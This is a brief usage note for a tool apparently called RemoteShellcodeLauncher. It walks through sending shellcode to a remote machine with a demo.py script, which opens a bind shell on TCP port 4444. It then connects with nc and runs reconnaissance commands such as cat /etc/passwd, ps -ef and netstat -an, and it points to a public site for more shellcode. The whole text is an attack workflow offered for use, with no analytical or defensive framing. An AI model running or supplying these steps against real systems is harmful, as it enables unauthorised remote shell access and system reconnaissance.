get RemoteShellcodeLauncher to run on a remote machine
./RemoteShellcodeLauncher 1111

on local machine run
demo.py remotehost 1111 (the shell code opens a tcp port 4444)

connect from local machine with
nc remotehost 4444

issue commands
ls
cat /etc/passwd
ps -ef
netstat -an
etc...


get more shellcodes here: http://www.shell-storm.org/shellcode/